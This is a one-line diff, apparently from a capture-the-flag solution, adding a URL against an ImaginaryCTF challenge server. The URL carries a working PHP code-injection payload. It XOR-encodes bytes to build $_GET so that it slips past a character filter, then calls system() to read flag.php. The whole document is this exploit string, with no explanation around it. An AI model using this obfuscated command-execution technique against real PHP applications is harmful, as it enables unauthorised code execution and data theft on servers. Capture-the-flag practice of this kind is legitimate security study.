@@ -1,0 +1,2 @@
+http://puzzler7.imaginaryctf.org:4011/?cmd=${%27%A0%B8%BA%AB%27^%27%FF%FF%FF%FF%27}[_](${%27%A0%B8%BA%AB%27^%27%FF%FF%FF%FF%27}[__]);&_=system&__=cat%20flag.php
+
